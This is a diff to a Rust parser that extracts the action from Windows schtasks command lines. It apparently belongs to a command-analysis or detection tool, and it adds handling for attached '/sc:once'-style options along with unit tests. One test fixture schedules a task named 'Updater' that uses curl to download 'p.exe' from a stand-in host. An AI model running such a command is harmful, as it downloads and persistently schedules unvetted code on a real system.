@@ -897,8 +897,13 @@ fn schtasks_unquoted_value_end(raw: &str, value_spans: &[std::ops::Range<usize>]
 }
 
 fn schtasks_option_token(token: &str) -> bool {
+    let lower = token.to_ascii_lowercase();
+    let name = lower
+        .split_once([':', '='])
+        .map(|(name, _)| name)
+        .unwrap_or(&lower);
     matches!(
-        token.to_ascii_lowercase().as_str(),
+        name,
         "/create"
             | "/change"
             | "/delete"
@@ -1530,6 +1535,16 @@ mod tests {
     }
 
     #[test]
+    fn schtasks_task_run_stops_at_attached_schedule_option() {
+        let command = schtasks_task_run(
+            r#"schtasks /create /tn Updater /tr cmd.exe /c echo hi /sc:once /st:00:00"#,
+        )
+        .expect("task action should parse");
+
+        assert_eq!(command, "cmd.exe /c echo hi");
+    }
+
+    #[test]
     fn schtasks_attached_unquoted_task_run_collects_until_next_task_option() {
         let command = schtasks_task_run(
             r#"schtasks /create /tn Updater /tr=cmd.exe /c curl -o out.exe https://attached-tr.example/p.exe /sc once /st 00:00"#,
@@ -1540,6 +1555,15 @@ mod tests {
             command,
             "cmd.exe /c curl -o out.exe https://attached-tr.example/p.exe"
         );
+    }
+
+    #[test]
+    fn schtasks_attached_quoted_task_run_preserves_command() {
+        let command =
+            schtasks_task_run(r#"schtasks /create /tn Updater /tr:"cmd.exe /c echo hi" /sc once"#)
+                .expect("attached quoted task action should parse");
+
+        assert_eq!(command, "cmd.exe /c echo hi");
     }
 
     #[test]
